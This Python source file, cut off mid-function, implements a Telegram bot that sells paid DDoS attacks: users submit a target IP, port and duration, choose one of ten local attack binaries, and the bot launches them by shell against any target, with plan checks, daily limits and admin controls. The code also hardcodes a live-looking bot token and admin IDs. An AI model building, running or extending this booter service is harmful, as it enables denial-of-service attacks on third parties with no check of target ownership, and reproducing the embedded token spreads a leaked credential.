import time
import json
import os
import logging
import asyncio
from threading import Lock
import threading
from datetime import datetime, timedelta
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import re
import sys
import socket
import urllib3
import requests
import dns.resolver
import psutil
import random
import uuid

LOCK_FILE = "bot.lock"

def check_already_running():
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, "r") as f:
                pid = int(f.read().strip())
            if psutil.pid_exists(pid):
                print("Bot is already running! Exiting.")
                sys.exit()
            else:
                print("Stale lock file found. Removing.")
                os.remove(LOCK_FILE)
        except (ValueError, OSError):
            print("Invalid lock file. Removing.")
            os.remove(LOCK_FILE)
    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))

def remove_lock():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# ===== CONFIGURATION =====
BOT_TOKEN = "7841513464:AAHZ3qrFQFCujx3S8U-u0USu5tO_MUAxEEc"
ADMIN_IDS = [7383077317, 1066744659, 1202212810]
SUPPORT_USERNAME = "@X9HYDRA"
DEVELOPER = "@X9HYDRA"
INVITE_BONUS_CONTACT = "@x9hydra"
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
MAX_ATTACK_DURATION = 240
MAX_CONCURRENT_ATTACKS = 10
DAILY_ATTACK_LIMIT = 100
DEFAULT_COOLDOWN = 100
RETRY_ATTEMPTS = 5
RETRY_BACKOFF = 5
DNS_SERVERS = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
USERS_FILE = 'users.json'
ATTACK_LOG_FILE = 'attack_logs.json'
BAN_LIST_FILE = 'banned_users.json'
SYSTEM_STATS_FILE = 'system_stats.json'
GROUPS_FILE = 'groups.json'
COOLDOWN_FILE = 'cooldown.json'
INVITES_FILE = 'invites.json'
ATTACK_IMAGES = [
    "https://files.catbox.moe/kth6cp.jpeg",
    "https://files.catbox.moe/kth6cp.jpeg",
    "https://files.catbox.moe/kth6cp.jpeg",
    "https://files.catbox.moe/kth6cp.jpeg",
    "https://files.catbox.moe/kth6cp.jpeg",
    "https://files.catbox.moe/lo2lip.jpg",
    "https://files.catbox.moe/lo2lip.jpg",
    "https://files.catbox.moe/eexckq.jpg",
    "https://files.catbox.moe/voutyl.jpg",
    "https://files.catbox.moe/c0qmrm.jpg",
    "https://files.catbox.moe/mltobn.jpg",
    "https://files.catbox.moe/voutyl.jpg",
    "https://files.catbox.moe/lrcgg2.jpg",
    "https://files.catbox.moe/tc7p1j.jpg",
    "https://files.catbox.moe/lu66mv.jpg",
    "https://files.catbox.moe/szpt44.jpg",
    "https://files.catbox.moe/ms3cbs.jpg",
    "https://files.catbox.moe/2g6hpa.jpg",
    "https://files.catbox.moe/a4qyv3.jpg",
    "https://files.catbox.moe/qmup2k.jpg",
    "https://files.catbox.moe/iqhw91.jpg",
    "https://files.catbox.moe/0u1huh.jpg",
    "https://files.catbox.moe/huhx40.jpg",
    "https://files.catbox.moe/x6gcnf.jpg",
    "https://files.catbox.moe/z0o6of.jpg",
    "https://files.catbox.moe/s40m6b.jpg",
    "https://files.catbox.moe/icr8ta.jpg",
    "https://files.catbox.moe/enx46y.jpg",
    "https://files.catbox.moe/8wikbx.jpg",
    "https://files.catbox.moe/9luucn.jpg",
    "https://files.catbox.moe/u6batq.jpg",
    "https://files.catbox.moe/tz0oul.jpg",
    "https://files.catbox.moe/8uatwv.jpg",
    "https://files.catbox.moe/bb8q8a.jpg",
    "https://files.catbox.moe/rkjwlq.jpg",
    "https://files.catbox.moe/ponfrg.jpg",
    "https://files.catbox.moe/8gn4ug.jpg",
    "https://files.catbox.moe/vmmhpp.jpg",
    "https://files.catbox.moe/9d8xde.jpg",
    "https://files.catbox.moe/72gdmb.jpg",
    "https://files.catbox.moe/cliay1.jpg",
    "https://files.catbox.moe/l3l17j.jpg",
    "https://files.catbox.moe/3vgdyi.jpg",
    "https://files.catbox.moe/iv7yfo.jpg",
    "https://files.catbox.moe/dbbcqn.jpg",
]
PLAN_IMAGE = "https://files.catbox.moe/lo2lip.jpg"
ATTACK_BINARIES = [
    "./mrin",
    "./mrin2",
    "./mrin3",
    "./mrin4",
    "./mrin5",
    "./mrin6",
    "./mrin7",
    "./mrin8",
    "./mrin9",
    "./mrin10",
]
# ===== INITIALIZATION =====
admin_ids = [7383077317, 1066744659, 1202212810]
bot = telebot.TeleBot(BOT_TOKEN)
bot_start_time = datetime.now()
active_attacks = {}
pending_attacks = {}  # New dictionary to store pending attack details
file_lock = Lock()
attack_processes = {}
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
session = requests.Session()
retries = urllib3.util.retry.Retry(
    total=RETRY_ATTEMPTS,
    backoff_factor=RETRY_BACKOFF,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["GET", "POST"]
)
adapter = requests.adapters.HTTPAdapter(max_retries=retries)
session.mount("https://", adapter)
telebot.apihelper._get_req_session = lambda: session
try:
    resolver = dns.resolver.Resolver()
    resolver.nameservers = DNS_SERVERS
    resolver.timeout = 5
    resolver.lifetime = 5
except Exception as e:
    logger.warning(f"Failed to initialize DNS resolver: {e}. Using default resolver.")
    resolver = dns.resolver.Resolver()
# ===== DATA MANAGEMENT =====
def load_data(filename, default=None):
    if default is None:
        default = {}
    try:
        with file_lock:
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    return json.load(f)
        return default.copy()
    except Exception as e:
        logger.error(f"Error loading {filename}: {e}")
        return default.copy()

def save_data(filename, data):
    try:
        with file_lock:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Error saving {filename}: {e}")

users = load_data(USERS_FILE, default=[])
attack_logs = load_data(ATTACK_LOG_FILE, default=[])
banned_users = load_data(BAN_LIST_FILE, default=[])
system_stats = load_data(SYSTEM_STATS_FILE, default={
    "total_attacks": 0,
    "total_users": 0,
    "start_time": datetime.now().isoformat()
})
groups = load_data(GROUPS_FILE, default={"approved": [], "broadcast": []})
cooldown_settings = load_data(COOLDOWN_FILE, default={"global_cooldown": DEFAULT_COOLDOWN})
invites = load_data(INVITES_FILE, default=[])
# ===== UTILITY FUNCTIONS =====
def get_uptime():
    uptime = datetime.now() - datetime.fromisoformat(system_stats["start_time"])
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def format_time(timestamp):
    if not timestamp:
        return "Never"
    return datetime.fromisoformat(timestamp).strftime('%Y-%m-%d %H:%M:%S')

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return bool(re.match(pattern, ip)) and all(0 <= int(x) <= 255 for x in ip.split('.'))

def is_group_approved(chat_id):
    return str(chat_id) in groups["approved"]

# ===== USER MANAGEMENT =====
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def is_user_banned(user_id):
    return any(user['user_id'] == user_id for user in banned_users)

def get_user(user_id):
    for user in users:
        if user['user_id'] == user_id:
            return user
    return None

def get_user_attack_count(user_id):
    today = datetime.now().date()
    return sum(
        1 for log in attack_logs
        if log.get('user_id') == user_id
        and log.get('status') == 'completed'
        and datetime.fromisoformat(log['start_time']).date() == today
    )

def get_user_invite_bonus(user_id):
    return sum(1 for invite in invites if invite['user_id'] == user_id and invite['approved'])

def check_user_access(user_id, chat_id):
    if is_user_banned(user_id):
        return False, "⛔ You are banned from using this bot."
    user = get_user(user_id)
    if not user:
        return False, "❌ You are not registered. Contact admin."
    if user.get('plan', 0) <= 0:
        return False, "⚠️ You don't have an active plan."
    if 'valid_until' in user:
        expiry_date = datetime.strptime(user['valid_until'], '%Y-%m-%d').date()
        if datetime.now().date() > expiry_date:
            return False, "📅 Your plan has expired. Please renew."
    total_attacks = get_user_attack_count(user_id)
    invite_bonus = get_user_invite_bonus(user_id)
    effective_limit = DAILY_ATTACK_LIMIT + invite_bonus
    if total_attacks >= effective_limit:
        return False, f"⚠️ Daily attack limit reached ({total_attacks}/{effective_limit}). Try again tomorrow or contact {INVITE_BONUS_CONTACT} for more."
    return True, "✅ Access granted"

# ===== ATTACK MANAGEMENT =====
async def run_attack_async(target_ip, target_port, duration, user_id, chat_id, binary):
    global cooldown_settings
    if len(active_attacks) >= MAX_CONCURRENT_ATTACKS:
        bot.send_message(chat_id, "⚠️ Server is at maximum capacity. Please try again later.")
        return
    if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
        bot.send_message(chat_id, f"❌ Error: Binary {binary} not found or not executable.")
        return
    attack_id = f"{target_ip}:{target_port}-{user_id}-{time.time()}"
    start_time = datetime.now().isoformat()
    active_attacks[attack_id] = {
        'user_id': user_id,
        'start_time': start_time,
        'target': f"{target_ip}:{target_port}",
        'duration': duration,
        'binary': binary,
        'chat_id': chat_id
    }
    try:
        attack_data = {
            'attack_id': attack_id,
            'user_id': user_id,
            'target': f"{target_ip}:{target_port}",
            'duration': duration,
            'start_time': start_time,
            'binary': binary,
            'status': 'started'
        }
        attack_logs.append(attack_data)
        save_data(ATTACK_LOG_FILE, attack_logs)
        system_stats["total_attacks"] += 1
        save_data(SYSTEM_STATS_FILE, system_stats)
        start_msg = (
            f"🚀 <b>Attack Launched</b> 🚀\n\n"
            f"🎯 Target: <code>{target_ip}:{target_port}</code>\n"
            f"⏱ Duration: {duration} seconds\n"
            f"🛠 Binary: {binary}\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"🔢 Today's Attacks: {get_user_attack_count(user_id) + 1}/{DAILY_ATTACK_LIMIT + get_user_invite_bonus(user_id)}\n"
            f"🔄 Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}\n\n"
            f"⚡ <i>Attack in progress...</i>"
        )
        try:
            bot.send_message(chat_id, start_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Error sending attack start image: {e}")
            bot.send_message(chat_id, start_msg, parse_mode='HTML')
        command = f"{binary} {target_ip} {target_port} {duration} 1800"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        attack_processes[attack_id] = process
        stdout, stderr = await process.communicate()
        if process.returncode != 0:
            error_msg = f"Attack failed with error: {stderr.decode()}"
            bot.send_message(chat_id, error_msg)
            logger.error(error_msg)
            return
        end_msg = (
            f"✅ <b>Attack Completed</b> ✅\n\n"
            f"🎯 Target: <code>{target_ip}:{target_port}</code>\n"
            f"⏱ Duration: {duration} seconds\n"
            f"🛠 Binary: {binary}\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"🔢 Today's Attacks: {get_user_attack_count(user_id)}/{DAILY_ATTACK_LIMIT + get_user_invite_bonus(user_id)}\n"
            f"🔄 Active Attacks: {len(active_attacks) - 1}/{MAX_CONCURRENT_ATTACKS}\n\n"
            f"🛠️ {DEVELOPER}"
        )
        try:
            bot.send_message(chat_id, end_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Error sending attack complete image: {e}")
            bot.send_message(chat_id, end_msg, parse_mode='HTML')
        for log in attack_logs:
            if log['attack_id'] == attack_id:
                log['end_time'] = datetime.now().isoformat()
                log['status'] = 'completed'
                break
        save_data(ATTACK_LOG_FILE, attack_logs)
    except Exception as e:
        logger.error(f"Attack error: {e}")
        bot.send_message(chat_id, f"❌ Attack failed: {str(e)}")
    finally:
        active_attacks.pop(attack_id, None)
        attack_processes.pop(attack_id, None)

def run_attack(target_ip, target_port, duration, user_id, chat_id, binary):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_attack_async(target_ip, target_port, duration, user_id, chat_id, binary))
    finally:
        loop.close()

# ===== COMMAND HANDLERS =====
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.first_name
    chat_id = message.chat.id
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(KeyboardButton("🚀 Start Attack"))
    markup.add(KeyboardButton("👤 My Account"), KeyboardButton("📊 Stats"))
    if is_user_admin(user_id):
        markup.add(KeyboardButton("🛠 Admin Panel"))
    if not get_user(user_id):
        users.append({
            'user_id': user_id,
            'username': message.from_user.username,
            'plan': 0,
            'join_date': datetime.now().isoformat(),
            'total_attacks': 0
        })
        system_stats["total_users"] += 1
        save_data(USERS_FILE, users)
        save_data(SYSTEM_STATS_FILE, system_stats)
    welcome_msg = (
        f"👋 Welcome, {username}!\n\n"
        f"⚡ <b>DDoS Testing Bot</b> ⚡\n\n"
        f"🔹 Admin: {DEVELOPER}\n"
        f"🔹 Support: {SUPPORT_USERNAME}\n\n"
        f"📜 *Available Commands:*\n"
        f"1. *`/attack <IP> <PORT> <TIME>` - 🚀 Launch a test attack.*\n"
        f"2. *`/check_remaining_attack` - 🔢 Check your remaining attacks.*\n"
        f"3. *`/contact` - 📞 Reach out for support or premium plans.*\n"
        f"4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
        f"5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
        f"6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
        f"*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*\n\n"
        f"Use the buttons below to navigate:"
    )
    try:
        bot.send_message(chat_id, welcome_msg, reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error sending plan image: {e}")
        bot.send_message(chat_id, welcome_msg, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['test'])
def test_command(message):
    bot.send_message(message.chat.id, "Bot is working!")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(chat_id, "❌ Usage: /attack <IP> <PORT> <TIME>")
        return
    try:
        ip, port, duration = args[1], args[2], args[3]
        if not is_valid_ip(ip):
            bot.send_message(chat_id, "❌ Invalid IP address")
            return
        if not port.isdigit() or not duration.isdigit():
            bot.send_message(chat_id, "❌ Port and duration must be numbers")
            return
        port = int(port)
        duration = int(duration)
        if port in BLOCKED_PORTS:
            bot.send_message(chat_id, f"❌ Port {port} is blocked for security")
            return
        if not is_user_admin(user_id) and duration > MAX_ATTACK_DURATION:
            bot.send_message(chat_id, f"❌ Max duration is {MAX_ATTACK_DURATION}s for non-admins")
            return
        # Generate a unique attack ID
        attack_id = str(uuid.uuid4())[:8]  # Short UUID
        pending_attacks[attack_id] = {
            'ip': ip,
            'port': port,
            'duration': duration,
            'user_id': user_id,
            'chat_id': chat_id
        }
        markup = InlineKeyboardMarkup()
        for binary in ATTACK_BINARIES:
            callback_data = f"binary_{attack_id}_{binary}"
            logger.debug(f"Generated callback_data: {callback_data}")
            markup.add(InlineKeyboardButton(f"Use {binary}", callback_data=callback_data))
        bot.send_message(chat_id, "🛠 Select attack binary:", reply_markup=markup)
    except Exception as e:
        logger.error(f"Attack processing error: {e}")
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('binary_'))
def binary_selection_callback(call):
    try:
        data = call.data.split('_')
        if len(data) != 3:
            bot.send_message(call.message.chat.id, "❌ Invalid selection.")
            return
        _, attack_id, binary = data
        logger.debug(f"Processing callback: attack_id={attack_id}, binary={binary}")
        if attack_id not in pending_attacks:
            bot.send_message(call.message.chat.id, "❌ Attack request expired or invalid.")
            return
        attack_details = pending_attacks.pop(attack_id)
        ip = attack_details['ip']
        port = attack_details['port']
        duration = attack_details['duration']
        user_id = attack_details['user_id']
        chat_id = attack_details['chat_id']
        if call.from_user.id != user_id:
            bot.send_message(chat_id, "⛔ This attack is not initiated by you!")
            return
        if binary not in ATTACK_BINARIES:
            bot.send_message(chat_id, "❌ Invalid binary selected.")
            return
        bot.edit_message_text(
            f"✅ Selected binary: {binary}\nStarting attack on {ip}:{port} for {duration}s...",
            chat_id,
            call.message.message_id
        )
        threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, binary)).start()
    except Exception as e:
        logger.error(f"Binary selection error: {e}")
        bot.send_message(call.message.chat.id, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    if not active_attacks:
        bot.send_message(chat_id, "ℹ️ No active attacks to stop.")
        return
    for attack_id, attack_data in list(active_attacks.items()):
        try:
            process = attack_processes.get(attack_id)
            if process:
                process.terminate()
            active_attacks.pop(attack_id, None)
            attack_processes.pop(attack_id, None)
            bot.send_message(chat_id, f"✅ Attack {attack_id} stopped.")
        except Exception as e:
            logger.error(f"Error stopping attack {attack_id}: {e}")
            bot.send_message(chat_id, f"❌ Error stopping attack {attack_id}: {str(e)}")

@bot.message_handler(commands=['check_cooldown'])
def check_cooldown(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    cooldown = cooldown_settings.get("global_cooldown", DEFAULT_COOLDOWN)
    bot.send_message(chat_id, f"⏳ Global Cooldown: {cooldown} seconds")

@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    user = get_user(user_id)
    if not user:
        bot.send_message(chat_id, "❌ You are not registered. Contact admin.")
        return
    total_attacks = get_user_attack_count(user_id)
    invite_bonus = get_user_invite_bonus(user_id)
    effective_limit = DAILY_ATTACK_LIMIT + invite_bonus
    remaining = effective_limit - total_attacks
    bot.send_message(
        chat_id,
        f"🔢 Attack Stats\n\n"
        f"📊 Today's Attacks: {total_attacks}/{effective_limit}\n"
        f"✅ Remaining: {remaining}\n"
        f"💎 Invite Bonus: {invite_bonus} extra attacks"
    )

@bot.message_handler(commands=['checkinvite'])
def check_invite(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(chat_id, "❌ Usage: /checkinvite <user_id>")
        return
    try:
        target_user_id = int(args[1])
        invites.append({
            'user_id': target_user_id,
            'approved': True,
            'timestamp': datetime.now().isoformat(),
            'approved_by': user_id
        })
        save_data(INVITES_FILE, invites)
        bot.send_message(
            chat_id,
            f"✅ User {target_user_id} granted +1 attack for invite.\n"
            f"Contact {INVITE_BONUS_CONTACT} for more details."
        )
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid user ID")

@bot.message_handler(commands=['contact'])
def contact_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    bot.send_message(
        chat_id,
        f"📞 <b>Contact Support</b>\n\n"
        f"🔹 Support: {SUPPORT_USERNAME}\n"
        f"🔹 For premium plans or unlimited attacks, contact: {INVITE_BONUS_CONTACT}",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['when'])
def when_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    uptime = get_uptime()
    bot.send_message(
        chat_id,
        f"⏳ <b>Bot Status</b>\n\n"
        f"🔄 Uptime: {uptime}\n"
        f"⚡ Active Attacks: {len(active_attacks)}/{MAX_CONCURRENT_ATTACKS}\n"
        f"📅 Started: {format_time(system_stats.get('start_time'))}",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['canary'])
def canary_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    bot.send_message(
        chat_id,
        f"🦅 <b>Canary Version</b>\n\n"
        f"🔹 The latest Canary version is not publicly available yet.\n"
        f"📞 Contact {SUPPORT_USERNAME} for access to cutting-edge features!",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['rules'])
def rules_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    rules = (
        f"📜 <b>Bot Rules</b>\n\n"
        f"1. 🚫 Do not attack blocked ports: {', '.join(map(str, BLOCKED_PORTS))}.\n"
        f"2. ⏱ Non-admins are limited to {MAX_ATTACK_DURATION}s per attack.\n"
        f"3. 🔢 Daily attack limit: {DAILY_ATTACK_LIMIT} + invite bonuses.\n"
        f"4. 🛡️ Respect the bot and its users. Misuse may lead to a ban.\n"
        f"5. 📞 Contact {SUPPORT_USERNAME} for support or to report issues.\n\n"
        f"💡 Keep it fair and fun for everyone!"
    )
    bot.send_message(chat_id, rules, parse_mode='HTML')

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.send_message(chat_id, "❌ Usage: /broadcast <message>")
        return
    broadcast_msg = args[1]
    for group_id in groups["broadcast"]:
        try:
            bot.send_message(group_id, f"📢 <b>Broadcast</b>\n\n{broadcast_msg}", parse_mode='HTML')
        except Exception as e:
            logger.error(f"Error broadcasting to {group_id}: {e}")
    bot.send_message(chat_id, f"✅ Broadcast sent to {len(groups['broadcast'])} groups.")

@bot.message_handler(commands=['addgroup'])
def add_group_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    if message.chat.type not in ['group', 'supergroup']:
        bot.send_message(chat_id, "❌ This command can only be used in groups.")
        return
    if str(chat_id) in groups["broadcast"]:
        bot.send_message(chat_id, "ℹ️ This group is already in the broadcast list.")
        return
    groups["broadcast"].append(str(chat_id))
    save_data(GROUPS_FILE, groups)
    bot.send_message(chat_id, "✅ This group has been added to the broadcast list.")

@bot.message_handler(commands=['approve'])
def approve_group_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    if message.chat.type not in ['group', 'supergroup']:
        bot.send_message(chat_id, "❌ This command can only be used in groups.")
        return
    if str(chat_id) in groups["approved"]:
        bot.send_message(chat_id, "ℹ️ This group is already approved.")
        return
    groups["approved"].append(str(chat_id))
    save_data(GROUPS_FILE, groups)
    bot.send_message(chat_id, "✅ This group has been approved to use the bot.")

@bot.message_handler(commands=['disapprove'])
def disapprove_group_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    if message.chat.type not in ['group', 'supergroup']:
        bot.send_message(chat_id, "❌ This command can only be used in groups.")
        return
    if str(chat_id) not in groups["approved"]:
        bot.send_message(chat_id, "ℹ️ This group is not approved.")
        return
    groups["approved"].remove(str(chat_id))
    save_data(GROUPS_FILE, groups)
    bot.send_message(chat_id, "✅ This group has been disapproved and cannot use the bot.")

@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(chat_id, "❌ Usage: /unban <user_id>")
        return
    try:
        target_user_id = int(args[1])
        banned_user = next((u for u in banned_users if u['user_id'] == target_user_id), None)
        if not banned_user:
            bot.send_message(chat_id, f"ℹ️ User {target_user_id} is not banned.")
            return
        banned_users.remove(banned_user)
        save_data(BAN_LIST_FILE, banned_users)
        bot.send_message(chat_id, f"✅ User {target_user_id} has been unbanned.")
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid user ID")

@bot.message_handler(commands=['removeuser'])
def remove_user_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(chat_id, "❌ Usage: /removeuser <user_id>")
        return
    try:
        target_user_id = int(args[1])
        user = get_user(target_user_id)
        if not user:
            bot.send_message(chat_id, f"ℹ️ User {target_user_id} does not exist.")
            return
        global users
        users = [u for u in users if u['user_id'] != target_user_id]
        global attack_logs, invites, banned_users
        attack_logs = [log for log in attack_logs if log.get('user_id') != target_user_id]
        invites = [invite for invite in invites if invite.get('user_id') != target_user_id]
        banned_users = [banned for banned in banned_users if banned.get('user_id') != target_user_id]
        save_data(USERS_FILE, users)
        save_data(ATTACK_LOG_FILE, attack_logs)
        save_data(INVITES_FILE, invites)
        save_data(BAN_LIST_FILE, banned_users)
        system_stats["total_users"] = len(users)
        save_data(SYSTEM_STATS_FILE, system_stats)
        bot.send_message(chat_id, f"✅ User {target_user_id} has been permanently removed.")
        logger.info(f"User {target_user_id} removed by admin {user_id}")
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid user ID")

@bot.message_handler(commands=['reset'])
def reset_user_attacks_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(chat_id, "❌ Usage: /reset <user_id>")
        return
    try:
        target_user_id = int(args[1])
        global attack_logs
        attack_logs = [log for log in attack_logs if log.get('user_id') != target_user_id or datetime.fromisoformat(log['start_time']).date() != datetime.now().date()]
        save_data(ATTACK_LOG_FILE, attack_logs)
        bot.send_message(chat_id, f"✅ Attack count reset for user {target_user_id}.")
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid user ID")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(chat_id, "❌ Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(args[1])
        if seconds < 0:
            bot.send_message(chat_id, "❌ Cooldown cannot be negative.")
            return
        cooldown_settings["global_cooldown"] = seconds
        save_data(COOLDOWN_FILE, cooldown_settings)
        bot.send_message(chat_id, f"✅ Global cooldown set to {seconds} seconds.")
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid number of seconds")

@bot.message_handler(commands=['viewusers'])
def view_users_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    users_list = "\n".join([
        f"{i+1}. ID: {u['user_id']} | Username: @{u.get('username', 'N/A')} | Plan: {'Premium' if u.get('plan', 0) > 0 else 'Free'} | Attacks: {len([log for log in attack_logs if log.get('user_id') == u['user_id'] and log.get('status') == 'completed'])}"
        for i, u in enumerate(users[-20:])
    ])
    bot.send_message(
        chat_id,
        f"👥 <b>User List</b> (Total: {len(users)})\n\n{users_list or 'No users'}",
        parse_mode='HTML'
    )

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_id):
        bot.send_message(chat_id, "⛔ This command is for admins only!")
        return
    bot.send_message(chat_id, "⚠️ Shutting down the bot...")
    for attack_id, process in list(attack_processes.items()):
        try:
            process.terminate()
        except Exception as e:
            logger.error(f"Error stopping attack {attack_id}: {e}")
    logger.info("Bot shutdown initiated by admin.")
    bot.stop_polling()
    sys.exit(0)

# ===== BUTTON HANDLERS =====
@bot.message_handler(func=lambda message: message.text == "🚀 Start Attack")
def attack_button_command(message):
    logger.info(f"Attack button pressed by user {message.from_user.id}")
    user_id = message.from_user.id
    chat_id = message.chat.id
    access, reason = check_user_access(user_id, chat_id)
    if not access:
        bot.send_message(chat_id, reason)
        return
    bot.send_message(
        chat_id,
        "📡 <b>Enter attack details:</b>\n\n"
        "<code>IP PORT TIME</code>\n\n"
        "Example: <code>1.1.1.1 80 60</code>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(chat_id, "❌ Invalid format. Use: IP PORT TIME")
            return
        ip, port, duration = args[0], args[1], args[2]
        if not is_valid_ip(ip):
            bot.send_message(chat_id, "❌ Invalid IP address")
            return
        if not port.isdigit() or not duration.isdigit():
            bot.send_message(chat_id, "❌ Port and duration must be numbers")
            return
        port = int(port)
        duration = int(duration)
        if port in BLOCKED_PORTS:
            bot.send_message(chat_id, f"❌ Port {port} is blocked for security")
            return
        if not is_user_admin(user_id) and duration > MAX_ATTACK_DURATION:
            bot.send_message(chat_id, f"❌ Max duration is {MAX_ATTACK_DURATION}s for non-admins")
            return
        attack_id = str(uuid.uuid4())[:8]  # Short UUID
        pending_attacks[attack_id] = {
            'ip': ip,
            'port': port,
            'duration': duration,
            'user_id': user_id,
            'chat_id': chat_id
        }
        markup = InlineKeyboardMarkup()
        for binary in ATTACK_BINARIES:
            callback_data = f"binary_{attack_id}_{binary}"
            logger.debug(f"Generated callback_data: {callback_data}")
            markup.add(InlineKeyboardButton(f"Use {binary}", callback_data=callback_data))
